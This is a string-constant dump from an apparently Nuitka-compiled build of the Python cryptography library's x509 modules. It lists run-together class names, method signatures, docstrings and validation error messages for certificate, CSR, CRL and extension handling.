        uCertificateSigningRequest.get_attribute_for_oidaload_pem_x509_certificateaload_der_x509_certificateaload_pem_x509_certificatesaload_pem_x509_csraload_der_x509_csraload_pem_x509_crlaload_der_x509_crlDasubject_nameaextensionsaattributesuName | Noneulist[Extension[ExtensionType]]ulist[tuple[ObjectIdentifier, bytes, int | None]]uCertificateSigningRequestBuilder.__init__DanameareturnaNameaCertificateSigningRequestBuilderasubject_nameuCertificateSigningRequestBuilder.subject_nameDaextvalacriticalareturnaExtensionTypeaboolaCertificateSigningRequestBuilderaadd_extensionuCertificateSigningRequestBuilder.add_extensionDa_tagnDaoidavaluea_tagareturnaObjectIdentifierabytesu_ASN1Type | NoneaCertificateSigningRequestBuilderaadd_attributeuCertificateSigningRequestBuilder.add_attributeDarsa_paddingnDaprivate_keyaalgorithmabackendarsa_paddingareturnaCertificateIssuerPrivateKeyTypesu_AllowedHashTypes | Noneutyping.Anyupadding.PSS | padding.PKCS1v15 | NoneaCertificateSigningRequestasignuCertificateSigningRequestBuilder.signa__annotations__ulist[Extension[ExtensionType]]Daissuer_nameasubject_nameapublic_keyaserial_numberanot_valid_beforeanot_valid_afteraextensionsareturnuName | NoneuName | NoneuCertificatePublicKeyTypes | Noneuint | Noneudatetime.datetime | Noneudatetime.datetime | Noneulist[Extension[ExtensionType]]aNoneuCertificateBuilder.__init__DanameareturnaNameaCertificateBuilderaissuer_nameuCertificateBuilder.issuer_nameuCertificateBuilder.subject_nameDakeyareturnaCertificatePublicKeyTypesaCertificateBuilderuCertificateBuilder.public_keyDanumberareturnaintaCertificateBuilderuCertificateBuilder.serial_numberDatimeareturnudatetime.datetimeaCertificateBuilderuCertificateBuilder.not_valid_beforeuCertificateBuilder.not_valid_afterDaextvalacriticalareturnaExtensionTypeaboolaCertificateBuilderuCertificateBuilder.add_extensionDaprivate_keyaalgorithmabackendarsa_paddingareturnaCertificateIssuerPrivateKeyTypesu_AllowedHashTypes | Noneutyping.Anyupadding.PSS | padding.PKCS1v15 | NoneaCertificateuCertificateBuilder.signulist[RevokedCertificate]Daissuer_namealast_updateanext_updateaextensionsarevoked_certificatesuName | Noneudatetime.datetime | Noneudatetime.datetime | Noneulist[Extension[ExtensionType]]ulist[RevokedCertificate]uCertificateRevocationListBuilder.__init__Daissuer_nameareturnaNameaCertificateRevocationListBuilderuCertificateRevocationListBuilder.issuer_nameDalast_updateareturnudatetime.datetimeaCertificateRevocationListBuilderuCertificateRevocationListBuilder.last_updateDanext_updateareturnudatetime.datetimeaCertificateRevocationListBuilderuCertificateRevocationListBuilder.next_updateDaextvalacriticalareturnaExtensionTypeaboolaCertificateRevocationListBuilderuCertificateRevocationListBuilder.add_extensionDarevoked_certificateareturnaRevokedCertificateaCertificateRevocationListBuilderaadd_revoked_certificateuCertificateRevocationListBuilder.add_revoked_certificateDaprivate_keyaalgorithmabackendarsa_paddingareturnaCertificateIssuerPrivateKeyTypesu_AllowedHashTypes | Noneutyping.Anyupadding.PSS | padding.PKCS1v15 | NoneaCertificateRevocationListuCertificateRevocationListBuilder.signDaserial_numberarevocation_dateaextensionsuint | Noneudatetime.datetime | Noneulist[Extension[ExtensionType]]uRevokedCertificateBuilder.__init__DanumberareturnaintaRevokedCertificateBuilderuRevokedCertificateBuilder.serial_numberDatimeareturnudatetime.datetimeaRevokedCertificateBuilderuRevokedCertificateBuilder.revocation_dateDaextvalacriticalareturnaExtensionTypeaboolaRevokedCertificateBuilderuRevokedCertificateBuilder.add_extensionDabackendareturnutyping.AnyaRevokedCertificateabuilduRevokedCertificateBuilder.buildarandom_serial_numberucryptography\x509\base.pyu<module cryptography.x509.base>Ta__class__TaselfaotherTaselfaidxTaselfTaselfaoidavaluea_typeTaselfamsgaoida__class__TaselfaattributesTaselfaissuer_nameasubject_nameapublic_keyaserial_numberanot_valid_beforeanot_valid_afteraextensionsTaselfaissuer_namealast_updateanext_updateaextensionsarevoked_certificatesTaselfasubject_nameaextensionsaattributesTaselfamsgaparsed_versiona__class__Taselfaserial_numberarevocation_dateaextensionsTatimeaoffsetTaoidaattributesaattr_oidw_TaextensionaextensionsweTaselfaoidavaluea_tagatagTaselfaextvalacriticalaextensionTaselfarevoked_certificateTaselfabackendTaselfaalgorithmTaselfaoidaattrTaselfaoidTaselfaserial_numberTaselfapublic_keyTaselfanameTaselfaissuer_nameTaselfalast_updateTaselfanext_updateTaselfatimeTaselfaencodingTaselfakeyTaselfanumberTaselfaprivate_keyaalgorithmabackendarsa_paddingTaselfaissuer.cryptography.x509.certificate_transparencylWa__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabcladatetimeacryptographyTautilsautilsucryptography.hazmat.bindings._rustTax509ax509arust_x509ucryptography.hazmat.primitives.hashesTaHashAlgorithmaHashAlgorithmaEnuma__prepare__aLogEntryTypea__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.x509.certificate_transparencya__module__a__qualname__aX509_CERTIFICATElaPRE_CERTIFICATEa__orig_bases__aVersionav1aSignatureAlgorithmu
    Signature algorithms that are valid for SCTs.

    These are exactly the same as SignatureAlgorithm in RFC 5246 (TLS 1.2).

    See: <https://datatracker.ietf.org/doc/html/rfc5246#section-7.4.1.4.1>
    aANONYMOUSaRSAlaDSAlaECDSAametaclassaABCMetaTaSignedCertificateTimestampTaSignedCertificateTimestampapropertyaabstractmethodDareturnaVersionu
        Returns the SCT version.
        aversionuSignedCertificateTimestamp.versionDareturnabytesu
        Returns an identifier indicating which log this SCT is for.
        alog_iduSignedCertificateTimestamp.log_idDareturnudatetime.datetimeu
        Returns the timestamp for this SCT.
        atimestampuSignedCertificateTimestamp.timestampDareturnaLogEntryTypeu
        Returns whether this is an SCT for a certificate or pre-certificate.
        aentry_typeuSignedCertificateTimestamp.entry_typeDareturnaHashAlgorithmu
        Returns the hash algorithm used for the SCT's signature.
        asignature_hash_algorithmuSignedCertificateTimestamp.signature_hash_algorithmDareturnaSignatureAlgorithmu
        Returns the signing algorithm used for the SCT's signature.
        asignature_algorithmuSignedCertificateTimestamp.signature_algorithmu
        Returns the signature for this SCT.
        asignatureuSignedCertificateTimestamp.signatureu
        Returns the raw bytes of any extensions for this SCT.
        aextension_bytesuSignedCertificateTimestamp.extension_bytesaregisteraSctucryptography\x509\certificate_transparency.pyu<module cryptography.x509.certificate_transparency>Ta__class__Taselfu.cryptography.x509a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_cryptographyu\not_existingax509TaNUITKA_PACKAGE_cryptography_x509u\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__aannotationsucryptography.x509Tacertificate_transparencyaverificationlacertificate_transparencyaverificationucryptography.x509.baseTaAttributeaAttributeNotFoundaAttributesaCertificateaCertificateBuilderaCertificateRevocationListaCertificateRevocationListBuilderaCertificateSigningRequestaCertificateSigningRequestBuilderaInvalidVersionaRevokedCertificateaRevokedCertificateBuilderaVersionaload_der_x509_certificateaload_der_x509_crlaload_der_x509_csraload_pem_x509_certificateaload_pem_x509_certificatesaload_pem_x509_crlaload_pem_x509_csrarandom_serial_numberaAttributeaAttributeNotFoundaAttributesaCertificateaCertificateBuilderaCertificateRevocationListaCertificateRevocationListBuilderaCertificateSigningRequestaCertificateSigningRequestBuilderaInvalidVersionaRevokedCertificateaRevokedCertificateBuilderaVersionaload_der_x509_certificateaload_der_x509_crlaload_der_x509_csraload_pem_x509_certificateaload_pem_x509_certificatesaload_pem_x509_crlaload_pem_x509_csrarandom_serial_numberucryptography.x509.extensionsT+aAccessDescriptionaAuthorityInformationAccessaAuthorityKeyIdentifieraBasicConstraintsaCertificateIssueraCertificatePoliciesaCRLDistributionPointsaCRLNumberaCRLReasonaDeltaCRLIndicatoraDistributionPointaDuplicateExtensionaExtendedKeyUsageaExtensionaExtensionNotFoundaExtensionsaExtensionTypeaFreshestCRLaGeneralNamesaInhibitAnyPolicyaInvalidityDateaIssuerAlternativeNameaIssuingDistributionPointaKeyUsageaMSCertificateTemplateaNameConstraintsaNoticeReferenceaOCSPAcceptableResponsesaOCSPNoCheckaOCSPNonceaPolicyConstraintsaPolicyInformationaPrecertificateSignedCertificateTimestampsaPrecertPoisonaReasonFlagsaSignedCertificateTimestampsaSubjectAlternativeNameaSubjectInformationAccessaSubjectKeyIdentifieraTLSFeatureaTLSFeatureTypeaUnrecognizedExtensionaUserNoticeaAccessDescriptionaAuthorityInformationAccessaAuthorityKeyIdentifieraBasicConstraintsaCertificateIssueraCertificatePoliciesaCRLDistributionPointsaCRLNumberaCRLReasonaDeltaCRLIndicatoraDistributionPointaDuplicateExtensionaExtendedKeyUsageaExtensionaExtensionNotFoundaExtensionsaExtensionTypeaFreshestCRLaGeneralNamesaInhibitAnyPolicyaInvalidityDateaIssuerAlternativeNameaIssuingDistributionPointaKeyUsageaMSCertificateTemplateaNameConstraintsaNoticeReferenceaOCSPAcceptableResponsesaOCSPNoCheckaOCSPNonceaPolicyConstraintsaPolicyInformationaPrecertificateSignedCertificateTimestampsaPrecertPoisonaReasonFlagsaSignedCertificateTimestampsaSubjectAlternativeNameaSubjectInformationAccessaSubjectKeyIdentifieraTLSFeatureaTLSFeatureTypeaUnrecognizedExtensionaUserNoticeucryptography.x509.general_nameTaDirectoryNameaDNSNameaGeneralNameaIPAddressaOtherNameaRegisteredIDaRFC822NameaUniformResourceIdentifieraUnsupportedGeneralNameTypeaDirectoryNameaDNSNameaGeneralNameaIPAddressaOtherNameaRegisteredIDaRFC822NameaUniformResourceIdentifieraUnsupportedGeneralNameTypeucryptography.x509.nameTaNameaNameAttributeaRelativeDistinguishedNameaNameaNameAttributeaRelativeDistinguishedNameucryptography.x509.oidTaAuthorityInformationAccessOIDaCertificatePoliciesOIDaCRLEntryExtensionOIDaExtendedKeyUsageOIDaExtensionOIDaNameOIDaObjectIdentifieraPublicKeyAlgorithmOIDaSignatureAlgorithmOIDaAuthorityInformationAccessOIDaCertificatePoliciesOIDaCRLEntryExtensionOIDaExtendedKeyUsageOIDaExtensionOIDaNameOIDaObjectIdentifieraPublicKeyAlgorithmOIDaSignatureAlgorithmOIDaAUTHORITY_INFORMATION_ACCESSaOID_AUTHORITY_INFORMATION_ACCESSaAUTHORITY_KEY_IDENTIFIERaOID_AUTHORITY_KEY_IDENTIFIERaBASIC_CONSTRAINTSaOID_BASIC_CONSTRAINTSaCERTIFICATE_POLICIESaOID_CERTIFICATE_POLICIESaCRL_DISTRIBUTION_POINTSaOID_CRL_DISTRIBUTION_POINTSaEXTENDED_KEY_USAGEaOID_EXTENDED_KEY_USAGEaFRESHEST_CRLaOID_FRESHEST_CRLaINHIBIT_ANY_POLICYaOID_INHIBIT_ANY_POLICYaISSUER_ALTERNATIVE_NAMEaOID_ISSUER_ALTERNATIVE_NAMEaKEY_USAGEaOID_KEY_USAGEaNAME_CONSTRAINTSaOID_NAME_CONSTRAINTSaOCSP_NO_CHECKaOID_OCSP_NO_CHECKaPOLICY_CONSTRAINTSaOID_POLICY_CONSTRAINTSaPOLICY_MAPPINGSaOID_POLICY_MAPPINGSaSUBJECT_ALTERNATIVE_NAMEaOID_SUBJECT_ALTERNATIVE_NAMEaSUBJECT_DIRECTORY_ATTRIBUTESaOID_SUBJECT_DIRECTORY_ATTRIBUTESaSUBJECT_INFORMATION_ACCESSaOID_SUBJECT_INFORMATION_ACCESSaSUBJECT_KEY_IDENTIFIERaOID_SUBJECT_KEY_IDENTIFIERaDSA_WITH_SHA1aOID_DSA_WITH_SHA1aDSA_WITH_SHA224aOID_DSA_WITH_SHA224aDSA_WITH_SHA256aOID_DSA_WITH_SHA256aECDSA_WITH_SHA1aOID_ECDSA_WITH_SHA1aECDSA_WITH_SHA224aOID_ECDSA_WITH_SHA224aECDSA_WITH_SHA256aOID_ECDSA_WITH_SHA256aECDSA_WITH_SHA384aOID_ECDSA_WITH_SHA384aECDSA_WITH_SHA512aOID_ECDSA_WITH_SHA512aRSA_WITH_MD5aOID_RSA_WITH_MD5aRSA_WITH_SHA1aOID_RSA_WITH_SHA1aRSA_WITH_SHA224aOID_RSA_WITH_SHA224aRSA_WITH_SHA256aOID_RSA_WITH_SHA256aRSA_WITH_SHA384aOID_RSA_WITH_SHA384aRSA_WITH_SHA512aOID_RSA_WITH_SHA512aRSASSA_PSSaOID_RSASSA_PSSaCOMMON_NAMEaOID_COMMON_NAMEaCOUNTRY_NAMEaOID_COUNTRY_NAMEaDOMAIN_COMPONENTaOID_DOMAIN_COMPONENTaDN_QUALIFIERaOID_DN_QUALIFIERaEMAIL_ADDRESSaOID_EMAIL_ADDRESSaGENERATION_QUALIFIERaOID_GENERATION_QUALIFIERaGIVEN_NAMEaOID_GIVEN_NAMEaLOCALITY_NAMEaOID_LOCALITY_NAMEaORGANIZATIONAL_UNIT_NAMEaOID_ORGANIZATIONAL_UNIT_NAMEaORGANIZATION_NAMEaOID_ORGANIZATION_NAMEaPSEUDONYMaOID_PSEUDONYMaSERIAL_NUMBERaOID_SERIAL_NUMBERaSTATE_OR_PROVINCE_NAMEaOID_STATE_OR_PROVINCE_NAMEaSURNAMEaOID_SURNAMEaTITLEaOID_TITLEaCLIENT_AUTHaOID_CLIENT_AUTHaCODE_SIGNINGaOID_CODE_SIGNINGaEMAIL_PROTECTIONaOID_EMAIL_PROTECTIONaOCSP_SIGNINGaOID_OCSP_SIGNINGaSERVER_AUTHaOID_SERVER_AUTHaTIME_STAMPINGaOID_TIME_STAMPINGaANY_POLICYaOID_ANY_POLICYaCPS_QUALIFIERaOID_CPS_QUALIFIERaCPS_USER_NOTICEaOID_CPS_USER_NOTICEaCERTIFICATE_ISSUERaOID_CERTIFICATE_ISSUERaCRL_REASONaOID_CRL_REASONaINVALIDITY_DATEaOID_INVALIDITY_DATEaCA_ISSUERSaOID_CA_ISSUERSaOCSPaOID_OCSPLUaOID_CA_ISSUERSaOID_OCSPaAccessDescriptionaAttributeaAttributeNotFoundaAttributesaAuthorityInformationAccessaAuthorityKeyIdentifieraBasicConstraintsaCRLDistributionPointsaCRLNumberaCRLReasonaCertificateaCertificateBuilderaCertificateIssueraCertificatePoliciesaCertificateRevocationListaCertificateRevocationListBuilderaCertificateSigningRequestaCertificateSigningRequestBuilderaDNSNameaDeltaCRLIndicatoraDirectoryNameaDistributionPointaDuplicateExtensionaExtendedKeyUsageaExtensionaExtensionNotFoundaExtensionTypeaExtensionsaFreshestCRLaGeneralNameaGeneralNamesaIPAddressaInhibitAnyPolicyaInvalidVersionaInvalidityDateaIssuerAlternativeNameaIssuingDistributionPointaKeyUsageaMSCertificateTemplateaNameaNameAttributeaNameConstraintsaNameOIDaNoticeReferenceaOCSPAcceptableResponsesaOCSPNoCheckaOCSPNonceaObjectIdentifieraOtherNameaPolicyConstraintsaPolicyInformationaPrecertPoisonaPrecertificateSignedCertificateTimestampsaPublicKeyAlgorithmOIDaRFC822NameaReasonFlagsaRegisteredIDaRelativeDistinguishedNameaRevokedCertificateaRevokedCertificateBuilderaSignatureAlgorithmOIDaSignedCertificateTimestampsaSubjectAlternativeNameaSubjectInformationAccessaSubjectKeyIdentifieraTLSFeatureaTLSFeatureTypeaUniformResourceIdentifieraUnrecognizedExtensionaUnsupportedGeneralNameTypeaUserNoticeaVersionacertificate_transparencyaload_der_x509_certificateaload_der_x509_crlaload_der_x509_csraload_pem_x509_certificateaload_pem_x509_certificatesaload_pem_x509_crlaload_pem_x509_csrarandom_serial_numberaverificationaverificationa__all__ucryptography\x509\__init__.pyu<module cryptography.x509>u.cryptography.x509.extensionsffaRSAPublicKeyapublic_bytesaserializationaEncodingaDERaPublicFormataPKCS1aEllipticCurvePublicKeyaX962aUncompressedPointaSubjectPublicKeyInfoaasn1aparse_spki_for_dataahashlibasha1adigestDareturnaintalen_methodu_make_sequence_methods.<locals>.len_methodaiter_methodu_make_sequence_methods.<locals>.iter_methodagetitem_methodu_make_sequence_methods.<locals>.getitem_methodafield_namea__class__a__init__aoidupublic_bytes is not implemented for extension type uu
        Serializes the extension type to DER.
        a_extensionsaExtensionNotFounduNo u extension was foundaUnrecognizedExtensionuUnrecognizedExtension can't be used with get_extension_for_class because more than one instance of the class may be present.avalueu<Extensions(u)>ucrl_number must be an integera_crl_numberaCRLNumberacrl_numberu<CRLNumber(arust_x509aencode_extension_valueuauthority_cert_issuer and authority_cert_serial_number must both be present or both Noneuauthority_cert_issuer must be a list of GeneralName objectsuauthority_cert_serial_number must be an integera_key_identifieraauthority_cert_issuera_authority_cert_issuera_authority_cert_serial_numberaGeneralNameu<genexpr>uAuthorityKeyIdentifier.__init__.<locals>.<genexpr>a_key_identifier_from_public_keyTakey_identifieraauthority_cert_issueraauthority_cert_serial_numberu<AuthorityKeyIdentifier(key_identifier=akey_identifieru, authority_cert_issuer=u, authority_cert_serial_number=aauthority_cert_serial_numberaAuthorityKeyIdentifiera_digestu<SubjectKeyIdentifier(digest=aSubjectKeyIdentifieraconstant_timeabytes_equEvery item in the descriptions list must be an AccessDescriptiona_descriptionsaAccessDescriptionuAuthorityInformationAccess.__init__.<locals>.<genexpr>u<AuthorityInformationAccess(aAuthorityInformationAccessuSubjectInformationAccess.__init__.<locals>.<genexpr>u<SubjectInformationAccess(aSubjectInformationAccessaObjectIdentifieruaccess_method must be an ObjectIdentifieruaccess_location must be a GeneralNamea_access_methoda_access_locationu<AccessDescription(access_method=aaccess_methodu, access_location=aaccess_locationuca must be a boolean valueupath_length must be None when ca is Falselupath_length must be a non-negative integer or Nonea_caa_path_lengthu<BasicConstraints(ca=acau, path_length=apath_lengthaBasicConstraintsaDeltaCRLIndicatoru<DeltaCRLIndicator(crl_number=udistribution_points must be a list of DistributionPoint objectsa_distribution_pointsaDistributionPointuCRLDistributionPoints.__init__.<locals>.<genexpr>u<CRLDistributionPoints(aCRLDistributionPointsuFreshestCRL.__init__.<locals>.<genexpr>u<FreshestCRL(aFreshestCRLuYou cannot provide both full_name and relative_name, at least one must be None.uEither full_name, relative_name or crl_issuer must be provided.ufull_name must be a list of GeneralName objectsaRelativeDistinguishedNameurelative_name must be a RelativeDistinguishedNameucrl_issuer must be None or a list of general namesureasons must be None or frozenset of ReasonFlagsaReasonFlagsaunspecifiedaremove_from_crluunspecified and remove_from_crl are not valid reasons in a DistributionPointafull_namea_full_namea_relative_namea_reasonsacrl_issuera_crl_issueruDistributionPoint.__init__.<locals>.<genexpr>u<DistributionPoint(full_name={0.full_name}, relative_name={0.relative_name}, reasons={0.reasons}, crl_issuer={0.crl_issuer})>arelative_nameareasonsurequire_explicit_policy must be a non-negative integer or Noneuinhibit_policy_mapping must be a non-negative integer or NoneuAt least one of require_explicit_policy and inhibit_policy_mapping must not be Nonea_require_explicit_policya_inhibit_policy_mappingu<PolicyConstraints(require_explicit_policy={0.require_explicit_policy}, inhibit_policy_mapping={0.inhibit_policy_mapping})>aPolicyConstraintsarequire_explicit_policyainhibit_policy_mappinguEvery item in the policies list must be a PolicyInformationa_policiesaPolicyInformationuCertificatePolicies.__init__.<locals>.<genexpr>u<CertificatePolicies(aCertificatePoliciesupolicy_identifier must be an ObjectIdentifiera_policy_identifierupolicy_qualifiers must be a list of strings and/or UserNotice objects or Noneapolicy_qualifiersa_policy_qualifiersaUserNoticeuPolicyInformation.__init__.<locals>.<genexpr>u<PolicyInformation(policy_identifier=apolicy_identifieru, policy_qualifiers=aNoticeReferenceunotice_reference must be None or a NoticeReferencea_notice_referencea_explicit_textu<UserNotice(notice_reference=anotice_referenceu, explicit_text=aexplicit_texta_organizationunotice_numbers must be a list of integersa_notice_numbersuNoticeReference.__init__.<locals>.<genexpr>u<NoticeReference(organization=aorganizationu, notice_numbers=anotice_numbersuEvery item in the usages list must be an ObjectIdentifiera_usagesuExtendedKeyUsage.__init__.<locals>.<genexpr>u<ExtendedKeyUsage(aExtendedKeyUsageaOCSPNoCheckaPrecertPoisonufeatures must be a list of elements from the TLSFeatureType enuma_featuresaTLSFeatureTypeuTLSFeature.__init__.<locals>.<genexpr>u<TLSFeature(features=aTLSFeatureuskip_certs must be an integeruskip_certs must be a non-negative integera_skip_certsu<InhibitAnyPolicy(skip_certs=askip_certsaInhibitAnyPolicyuencipher_only and decipher_only can only be true when key_agreement is truea_digital_signaturea_content_commitmenta_key_enciphermenta_data_enciphermenta_key_agreementa_key_cert_signa_crl_signa_encipher_onlya_decipher_onlyakey_agreementuencipher_only is undefined unless key_agreement is trueudecipher_only is undefined unless key_agreement is trueaencipher_onlyadecipher_onlyu<KeyUsage(digital_signature=adigital_signatureu, content_commitment=acontent_commitmentu, key_encipherment=akey_enciphermentu, data_encipherment=adata_enciphermentu, key_agreement=u, key_cert_sign=akey_cert_signu, crl_sign=acrl_signu, encipher_only=u, decipher_only=aKeyUsageupermitted_subtrees must be a non-empty list or Noneupermitted_subtrees must be a list of GeneralName objects or Nonea_validate_treeuexcluded_subtrees must be a non-empty list or Noneuexcluded_subtrees must be a list of GeneralName objects or Noneapermitted_subtreesaexcluded_subtreesuAt least one of permitted_subtrees and excluded_subtrees must not be Nonea_permitted_subtreesa_excluded_subtreesuNameConstraints.__init__.<locals>.<genexpr>aNameConstraintsa_validate_ip_namea_validate_dns_nameuIPAddress name constraints must be an IPv4Network or IPv6Network objectaIPAddressaipaddressaIPv4NetworkaIPv6NetworkuNameConstraints._validate_ip_name.<locals>.<genexpr>uDNSName name constraints must not contain the '*' wildcard characteraDNSNamew*uNameConstraints._validate_dns_name.<locals>.<genexpr>u<NameConstraints(permitted_subtrees=u, excluded_subtrees=uoid argument must be an ObjectIdentifier instance.ucritical must be a boolean valuea_oida_criticala_valueu<Extension(oid=u, critical=acriticalu, value=aExtensionuEvery item in the general_names list must be an object conforming to the GeneralName interfacea_general_namesuGeneralNames.__init__.<locals>.<genexpr>aOtherNameatypeuGeneralNames.get_values_for_type.<locals>.<genexpr>u<GeneralNames(aGeneralNamesaget_values_for_typeu<SubjectAlternativeName(aSubjectAlternativeNameu<IssuerAlternativeName(aIssuerAlternativeNameu<CertificateIssuer(aCertificateIssuerureason must be an element from ReasonFlagsa_reasonu<CRLReason(reason=aCRLReasonareasonadatetimeuinvalidity_date must be a datetime.datetimea_invalidity_dateu<InvalidityDate(invalidity_date=aInvalidityDateainvalidity_dateatzinfoareplaceatimezoneautcTatzinfoaastimezoneTatzuEvery item in the signed_certificate_timestamps list must be a SignedCertificateTimestampa_signed_certificate_timestampsaSignedCertificateTimestampuPrecertificateSignedCertificateTimestamps.__init__.<locals>.<genexpr>u<PrecertificateSignedCertificateTimestamps(aPrecertificateSignedCertificateTimestampsuSignedCertificateTimestamps.__init__.<locals>.<genexpr>u<SignedCertificateTimestamps(aSignedCertificateTimestampsunonce must be bytesa_nonceaOCSPNonceanonceu<OCSPNonce(nonce=uAll responses must be ObjectIdentifiersa_responsesuOCSPAcceptableResponses.__init__.<locals>.<genexpr>aOCSPAcceptableResponsesu<OCSPAcceptableResponses(responses=uonly_some_reasons must be None or frozenset of ReasonFlagsuunspecified and remove_from_crl are not valid reasons in an IssuingDistributionPointuonly_contains_user_certs, only_contains_ca_certs, indirect_crl and only_contains_attribute_certs must all be boolean.uOnly one of the following can be set to True: only_contains_user_certs, only_contains_ca_certs, indirect_crl, only_contains_attribute_certsuCannot create empty extension: if only_contains_user_certs, only_contains_ca_certs, indirect_crl, and only_contains_attribute_certs are all False, then either full_name, relative_name, or only_some_reasons must have a value.a_only_contains_user_certsa_only_contains_ca_certsa_indirect_crla_only_contains_attribute_certsa_only_some_reasonsuIssuingDistributionPoint.__init__.<locals>.<genexpr>u<IssuingDistributionPoint(full_name=u, relative_name=u, only_contains_user_certs=aonly_contains_user_certsu, only_contains_ca_certs=aonly_contains_ca_certsu, only_some_reasons=aonly_some_reasonsu, indirect_crl=aindirect_crlu, only_contains_attribute_certs=aonly_contains_attribute_certsaIssuingDistributionPointuoid must be an ObjectIdentifiera_template_idumajor_version and minor_version must be integers or Nonea_major_versiona_minor_versionu<MSCertificateTemplate(template_id=atemplate_idu, major_version=amajor_versionu, minor_version=aminor_versionaMSCertificateTemplateu<UnrecognizedExtension(oid=a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabcatypingacryptographyTautilsautilsucryptography.hazmat.bindings._rustTaasn1Tax509ax509ucryptography.hazmat.primitivesTaconstant_timeaserializationucryptography.hazmat.primitives.asymmetric.ecTaEllipticCurvePublicKeyucryptography.hazmat.primitives.asymmetric.rsaTaRSAPublicKeyucryptography.hazmat.primitives.asymmetric.typesTaCertificateIssuerPublicKeyTypesaCertificatePublicKeyTypesaCertificateIssuerPublicKeyTypesaCertificatePublicKeyTypesucryptography.x509.certificate_transparencyTaSignedCertificateTimestampucryptography.x509.general_nameTaDirectoryNameaDNSNameaGeneralNameaIPAddressaOtherNameaRegisteredIDaRFC822NameaUniformResourceIdentifiera_IPAddressTypesaDirectoryNameaRegisteredIDaRFC822NameaUniformResourceIdentifiera_IPAddressTypesucryptography.x509.nameTaNameaRelativeDistinguishedNameaNameucryptography.x509.oidTaCRLEntryExtensionOIDaExtensionOIDaObjectIdentifieraOCSPExtensionOIDaCRLEntryExtensionOIDaExtensionOIDaOCSPExtensionOIDaTypeVarTaExtensionTypeVaraExtensionTypetTaboundacovariantaExtensionTypeVarDapublic_keyareturnaCertificatePublicKeyTypesabytesDafield_nameastra_make_sequence_methodsTEExceptiona__prepare__aDuplicateExtensiona__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.x509.extensionsa__module__a__qualname__DamsgaoidareturnastraObjectIdentifieraNoneuDuplicateExtension.__init__a__orig_bases__uExtensionNotFound.__init__ametaclassaABCMetaTaExtensionTypeTaExtensionTypea__annotations__utyping.ClassVar[ObjectIdentifier]DareturnabytesuExtensionType.public_bytesaExtensionsDaextensionsareturnutyping.Iterable[Extension[ExtensionType]]aNoneuExtensions.__init__DaoidareturnaObjectIdentifieruExtension[ExtensionType]aget_extension_for_oiduExtensions.get_extension_for_oidDaextclassareturnutype[ExtensionTypeVar]uExtension[ExtensionTypeVar]aget_extension_for_classuExtensions.get_extension_for_classTa_extensionsutoo many values to unpack (expected 3)a__len__a__iter__Dareturnastra__repr__uExtensions.__repr__aCRL_NUMBERDacrl_numberareturnaintaNoneuCRLNumber.__init__Daotherareturnaobjectaboola__eq__uCRLNumber.__eq__a__hash__uCRLNumber.__hash__uCRLNumber.__repr__apropertyuCRLNumber.crl_numberuCRLNumber.public_bytesaAUTHORITY_KEY_IDENTIFIERDakey_identifieraauthority_cert_issueraauthority_cert_serial_numberareturnubytes | Noneutyping.Iterable[GeneralName] | Noneuint | NoneaNoneuAuthorityKeyIdentifier.__init__aclassmethodDapublic_keyareturnaCertificateIssuerPublicKeyTypesaAuthorityKeyIdentifierafrom_issuer_public_keyuAuthorityKeyIdentifier.from_issuer_public_keyDaskiareturnaSubjectKeyIdentifieraAuthorityKeyIdentifierafrom_issuer_subject_key_identifieruAuthorityKeyIdentifier.from_issuer_subject_key_identifieruAuthorityKeyIdentifier.__repr__uAuthorityKeyIdentifier.__eq__uAuthorityKeyIdentifier.__hash__Dareturnubytes | NoneuAuthorityKeyIdentifier.key_identifierDareturnulist[GeneralName] | NoneuAuthorityKeyIdentifier.authority_cert_issuerDareturnuint | NoneuAuthorityKeyIdentifier.authority_cert_serial_numberuAuthorityKeyIdentifier.public_bytesaSUBJECT_KEY_IDENTIFIERDadigestareturnabytesaNoneuSubjectKeyIdentifier.__init__Dapublic_keyareturnaCertificatePublicKeyTypesaSubjectKeyIdentifierafrom_public_keyuSubjectKeyIdentifier.from_public_keyuSubjectKeyIdentifier.digestuSubjectKeyIdentifier.key_identifieruSubjectKeyIdentifier.__repr__uSubjectKeyIdentifier.__eq__uSubjectKeyIdentifier.__hash__uSubjectKeyIdentifier.public_bytesaAUTHORITY_INFORMATION_ACCESSDadescriptionsareturnutyping.Iterable[AccessDescription]aNoneuAuthorityInformationAccess.__init__Ta_descriptionsuAuthorityInformationAccess.__repr__uAuthorityInformationAccess.__eq__uAuthorityInformationAccess.__hash__uAuthorityInformationAccess.public_bytesaSUBJECT_INFORMATION_ACCESSuSubjectInformationAccess.__init__uSubjectInformationAccess.__repr__uSubjectInformationAccess.__eq__uSubjectInformationAccess.__hash__uSubjectInformationAccess.public_bytesDaaccess_methodaaccess_locationareturnaObjectIdentifieraGeneralNameaNoneuAccessDescription.__init__uAccessDescription.__repr__uAccessDescription.__eq__uAccessDescription.__hash__DareturnaObjectIdentifieruAccessDescription.access_methodDareturnaGeneralNameuAccessDescription.access_locationaBASIC_CONSTRAINTSDacaapath_lengthareturnabooluint | NoneaNoneuBasicConstraints.__init__DareturnabooluBasicConstraints.cauBasicConstraints.path_lengthuBasicConstraints.__repr__uBasicConstraints.__eq__uBasicConstraints.__hash__uBasicConstraints.public_bytesaDELTA_CRL_INDICATORuDeltaCRLIndicator.__init__uDeltaCRLIndicator.crl_numberuDeltaCRLIndicator.__eq__uDeltaCRLIndicator.__hash__uDeltaCRLIndicator.__repr__uDeltaCRLIndicator.public_bytesaCRL_DISTRIBUTION_POINTSDadistribution_pointsareturnutyping.Iterable[DistributionPoint]aNoneuCRLDistributionPoints.__init__Ta_distribution_pointsuCRLDistributionPoints.__repr__uCRLDistributionPoints.__eq__uCRLDistributionPoints.__hash__uCRLDistributionPoints.public_bytesaFRESHEST_CRLuFreshestCRL.__init__uFreshestCRL.__repr__uFreshestCRL.__eq__uFreshestCRL.__hash__uFreshestCRL.public_bytesDafull_namearelative_nameareasonsacrl_issuerareturnutyping.Iterable[GeneralName] | NoneuRelativeDistinguishedName | Noneufrozenset[ReasonFlags] | Noneutyping.Iterable[GeneralName] | 